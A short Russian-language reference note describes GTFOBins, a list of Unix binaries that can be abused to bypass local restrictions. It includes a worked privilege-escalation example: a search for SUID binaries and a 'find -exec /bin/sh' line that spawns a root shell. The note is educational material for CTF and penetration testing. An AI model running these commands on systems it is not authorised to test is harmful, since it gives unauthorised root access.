# GTFOBins

## 1. Определения

**GTFOBins** ([https://gtfobins.github.io/](https://gtfobins.github.io/)) — это курируемый онлайн-список бинарных файлов Unix, которые могут быть использованы для обхода локальных ограничений безопасности и неправильно настроенных систем.

Проект не является инструментом, а базой знаний.

## 2. Основные концепции

Идея GTFOBins заключается в демонстрации того, как легитимные системные утилиты могут быть использованы не по прямому назначению для выполнения привилегированных операций. Это особенно актуально, если на бинарный файл установлен SUID-бит, что позволяет запустить его от имени владельца (часто `root`).

### Категории использования

* **Повышение привилегий (Privilege Escalation)**: Демонстрирует, как легитимные системные утилиты могут быть использованы для получения root-доступа.
* **Пост-эксплуатация**: Содержит техники для выполнения команд, создания обратных шеллов (`reverse shell`), передачи файлов и других действий после первоначального проникновения.

## 3. Практические сценарии

**Пример:** Использование `find` для повышения привилегий.

Если `find` имеет SUID-бит, его можно использовать для запуска шелла от имени root:

```bash
# Поиск бинарных файлов с SUID-битом
find / -perm -4000 -type f 2>/dev/null

# Если 'find' есть в списке:
sudo find . -exec /bin/sh \; -quit
```

## 4. Продвинутые детали

Проект активно используется в CTF-соревнованиях и при проведении тестов на проникновение для поиска быстрых путей повышения привилегий в системе.
